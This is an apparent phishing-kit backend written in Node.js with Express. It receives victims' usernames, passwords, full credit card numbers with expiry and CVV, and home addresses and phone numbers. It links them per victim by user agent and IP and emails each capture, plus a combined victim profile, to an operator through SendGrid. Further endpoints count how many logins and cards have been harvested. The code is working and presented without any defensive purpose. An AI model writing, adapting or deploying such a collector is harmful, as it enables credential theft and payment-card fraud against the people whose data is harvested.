const express = require('express');
const sgMail = require('@sendgrid/mail');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Initialize SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Function to send email via SendGrid
async function sendEmail(subject, textContent, dataType) {
    try {
        const msg = {
            to: process.env.RECIPIENT_EMAIL,
            from: {
                email: process.env.SENDGRID_FROM_EMAIL,
                name: 'Data Collection System'
            },
            subject: subject,
            text: textContent,
            categories: [dataType, 'data-collection']
        };

        const result = await sgMail.send(msg);
        console.log('SendGrid email sent:', result[0].statusCode);
        return true;
    } catch (error) {
        console.error('Error sending email via SendGrid:', error);
        if (error.response) {
            console.error('SendGrid error details:', error.response.body);
        }
        return false;
    }
}

// Function to format data as plain text
function formatDataAsText(data, dataType) {
    const getIcon = (type) => {
        switch(type) {
            case 'login': return 'ð';
            case 'credit_card': return 'ð³';
            case 'address_verification': return 'ð ';
            case 'address_skipped': return 'â­ï¸';
            case 'complete_profile': return 'ð¯';
            default: return 'ð';
        }
    };

    const header = `${getIcon(dataType)} NEW ${dataType.replace('_', ' ').toUpperCase()} DATA\n`;
    const separator = '='.repeat(50) + '\n';
    
    return header + separator + data + '\n' + separator;
}

// Function to create login data text
function createLoginText(credentials, userAgent, page, sessionData) {
    return `
LOGIN CREDENTIALS [SENSITIVE]
==============================
ð¤ Username: ${credentials.username || 'N/A'}
ð Password: ${credentials.password || 'N/A'}
ð¾ Remember Me: ${credentials.rememberMe ? 'Yes' : 'No'}
ð Page: ${page || 'N/A'}
ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
ð User Agent: ${userAgent || 'N/A'}
â° Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Function to create credit card data text
function createCreditCardText(cardData, userAgent, page, sessionData) {
    return `
CREDIT CARD INFORMATION [HIGHLY SENSITIVE]
===========================================
ð¤ First Name: ${cardData.firstName || 'N/A'}
ð¤ Last Name: ${cardData.lastName || 'N/A'}
ð³ Card Number: ${cardData.cardNumber || 'N/A'}
ð Expiry Date: ${cardData.expiryDate || 'N/A'}
ð CVV: ${cardData.cvv || 'N/A'}
â Terms Agreed: ${cardData.termsAgreed ? 'Yes' : 'No'}
ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
ð Page: ${page || 'N/A'}
â° Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Function to create address data text
function createAddressText(addressData, userAgent, page, sessionData) {
    return `
ADDRESS VERIFICATION [PERSONAL DATA]
====================================
ð  Address Line 1: ${addressData.addressLine1 || 'N/A'}
ð  Address Line 2: ${addressData.addressLine2 || 'N/A'}
ðï¸ City: ${addressData.city || 'N/A'}
ðºï¸ State/Province: ${addressData.state || 'N/A'}
ð® ZIP/Postal Code: ${addressData.zipCode || 'N/A'}
ð Country: ${addressData.country || 'N/A'}
ð Phone Number: ${addressData.phone || 'N/A'}
ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
ð Page: ${page || 'N/A'}
â° Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Function to create address skipped text
function createAddressSkippedText(skipData, userAgent, page, sessionData) {
    return `
ADDRESS VERIFICATION SKIPPED [USER ACTION]
==========================================
â­ï¸ Action: User chose to skip address verification
ð Reason: ${skipData.reason || 'user_skipped_address'}
ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
ð Page: ${page || 'N/A'}
â° Timestamp: ${new Date(skipData.timestamp).toLocaleString() || 'N/A'}
    `.trim();
}

// Function to create complete user profile text
function createCompleteProfileText(loginData, cardData, addressData, sessionData) {
    const hasAddress = addressData && !addressData.skipped;
    const status = hasAddress ? 'COMPLETE' : 'PARTIAL';
    
    let addressSection = '';
    if (hasAddress) {
        addressSection = `
ð  ADDRESS INFORMATION
======================
Address: ${addressData.addressLine1 || 'N/A'} ${addressData.addressLine2 || ''}
City/State/ZIP: ${addressData.city || 'N/A'}, ${addressData.state || 'N/A'} ${addressData.zipCode || 'N/A'}
Country: ${addressData.country || 'N/A'}
Phone: ${addressData.phone || 'N/A'}
        `.trim();
    } else {
        addressSection = `
â­ï¸ ADDRESS STATUS
=================
Status: User skipped address verification
        `.trim();
    }
    
    return `
COMPLETE USER PROFILE [${status}]
==================================
ð LOGIN INFORMATION
====================
Username: ${loginData.username || 'N/A'}
Password: ${loginData.password || 'N/A'}
Remember Me: ${loginData.rememberMe ? 'Yes' : 'No'}

ð³ PAYMENT INFORMATION
======================
Cardholder: ${cardData.firstName || 'N/A'} ${cardData.lastName || 'N/A'}
Card Number: ${cardData.cardNumber || 'N/A'}
Expiry Date: ${cardData.expiryDate || 'N/A'}
CVV: ${cardData.cvv || 'N/A'}
Terms Agreed: ${cardData.termsAgreed ? 'Yes' : 'No'}

${addressSection}

ð SESSION INFORMATION
======================
Language: ${sessionData?.language || 'Unknown'}
Timestamp: ${new Date().toLocaleString()}
    `.trim();
}

// Store user sessions to combine data
const userSessions = new Map();

app.post('/api/submit', async (req, res) => {
    const { type, data, timestamp, userAgent, page, sessionData } = req.body;
    
    console.log('ð¨ Received data type:', type);
    console.log('ð Page:', page);
    console.log('ð User Agent:', userAgent?.substring(0, 50) + '...');
    
    let subject = '';
    let textContent = '';
    let dataType = type || 'login';

    try {
        // Generate session ID based on user agent and IP
        const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const sessionId = `${userAgent}-${clientIP}-${sessionData?.language || 'unknown'}`;
        
        // Initialize session if not exists
        if (!userSessions.has(sessionId)) {
            userSessions.set(sessionId, {
                loginData: null,
                cardData: null,
                addressData: null,
                sessionData: sessionData,
                firstSeen: new Date(),
                ip: clientIP
            });
            console.log(`ð New session created: ${sessionId}`);
        }
        
        const userSession = userSessions.get(sessionId);
        
        // Store data based on type
        switch(dataType) {
            case 'login':
                userSession.loginData = data;
                subject = `ð LOGIN - ${data.username || 'Unknown User'}`;
                textContent = formatDataAsText(
                    createLoginText(data, userAgent, page, sessionData),
                    dataType
                );
                console.log(`â Login data stored for session: ${sessionId}`);
                break;
                
            case 'credit_card':
                userSession.cardData = data;
                subject = `ð³ CARD - ${data.firstName || 'Unknown'} ${data.lastName || ''}`;
                textContent = formatDataAsText(
                    createCreditCardText(data, userAgent, page, sessionData),
                    dataType
                );
                console.log(`â Credit card data stored for session: ${sessionId}`);
                break;
                
            case 'address_verification':
                userSession.addressData = data;
                subject = `ð  ADDRESS - ${data.city || 'Unknown Location'}, ${data.state || ''}`;
                textContent = formatDataAsText(
                    createAddressText(data, userAgent, page, sessionData),
                    dataType
                );
                console.log(`â Address data stored for session: ${sessionId}`);
                break;
                
            case 'address_skipped':
                userSession.addressData = { skipped: true, ...data };
                subject = `â­ï¸ SKIPPED - Address verification`;
                textContent = formatDataAsText(
                    createAddressSkippedText(data, userAgent, page, sessionData),
                    dataType
                );
                console.log(`â­ï¸ Address skipped for session: ${sessionId}`);
                break;
                
            default:
                subject = `ð UNKNOWN - Data submission`;
                textContent = formatDataAsText(
                    `Unknown Data Type: ${dataType}\n\nRaw Data:\n${JSON.stringify(data, null, 2)}`,
                    'unknown'
                );
                console.log(`â Unknown data type: ${dataType}`);
        }
        
        // Check if we have complete data for a profile summary
        if (userSession.loginData && userSession.cardData) {
            const hasAddress = userSession.addressData;
            const isComplete = hasAddress && !userSession.addressData.skipped;
            
            if (isComplete || dataType === 'address_skipped') {
                setTimeout(() => {
                    const status = isComplete ? 'COMPLETE' : 'PARTIAL';
                    const completeSubject = `ð¯ ${status} - ${userSession.loginData.username || 'User'}`;
                    const completeText = formatDataAsText(
                        createCompleteProfileText(
                            userSession.loginData,
                            userSession.cardData,
                            userSession.addressData,
                            userSession.sessionData
                        ),
                        'complete_profile'
                    );
                    sendEmail(completeSubject, completeText, 'complete_profile');
                    console.log(`ð ${status} profile summary sent for session: ${sessionId}`);
                }, 3000);
            }
        }
        
        // Clean up old sessions (older than 2 hours)
        const now = new Date();
        let cleanedCount = 0;
        for (const [id, session] of userSessions.entries()) {
            if (now - session.firstSeen > 2 * 60 * 60 * 1000) { // 2 hours
                userSessions.delete(id);
                cleanedCount++;
            }
        }
        if (cleanedCount > 0) {
            console.log(`ð§¹ Cleaned up ${cleanedCount} old sessions`);
        }
        
        // Send email
        const emailSent = await sendEmail(subject, textContent, dataType);
        
        if (emailSent) {
            console.log(`ð§ Email sent successfully for ${dataType} data`);
            res.json({ 
                status: 'success', 
                message: 'Data received and email sent via SendGrid',
                dataType: dataType,
                sessionId: sessionId,
                timestamp: new Date().toISOString()
            });
        } else {
            console.log(`â Failed to send email for ${dataType} data`);
            res.status(500).json({ 
                status: 'error', 
                message: 'Failed to send email via SendGrid' 
            });
        }
        
    } catch (error) {
        console.error('ð¥ Error processing request:', error);
        res.status(500).json({ 
            status: 'error', 
            message: 'Internal server error',
            error: error.message 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    const stats = {
        totalSessions: userSessions.size,
        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
        sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData && !s.addressData.skipped).length,
        sessionsSkippedAddress: Array.from(userSessions.values()).filter(s => s.addressData && s.addressData.skipped).length,
        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData && !s.addressData.skipped).length
    };
    
    res.json({ 
        status: 'Server is running', 
        email: 'SendGrid integration enabled',
        fromEmail: process.env.SENDGRID_FROM_EMAIL,
        uptime: process.uptime(),
        ...stats
    });
});

// Get session statistics
app.get('/api/sessions', (req, res) => {
    const stats = {
        totalSessions: userSessions.size,
        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
        sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData && !s.addressData.skipped).length,
        sessionsSkippedAddress: Array.from(userSessions.values()).filter(s => s.addressData && s.addressData.skipped).length,
        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData && !s.addressData.skipped).length,
        partialProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && (!s.addressData || s.addressData.skipped)).length
    };
    
    res.json(stats);
});

// Clear all sessions (for debugging)
app.delete('/api/sessions', (req, res) => {
    const count = userSessions.size;
    userSessions.clear();
    res.json({ 
        message: `Cleared ${count} sessions`,
        cleared: count 
    });
});

app.listen(PORT, () => {
    console.log(`ð Backend server running on port ${PORT}`);
    console.log(`ð§ SendGrid configured for: ${process.env.SENDGRID_FROM_EMAIL}`);
    console.log(`ð¨ Recipient: ${process.env.RECIPIENT_EMAIL}`);
    console.log(`ð Plain text email system ready`);
    console.log(`ð¥ Session tracking enabled`);
    console.log(`ð Health check: http://localhost:${PORT}/api/health`);
});
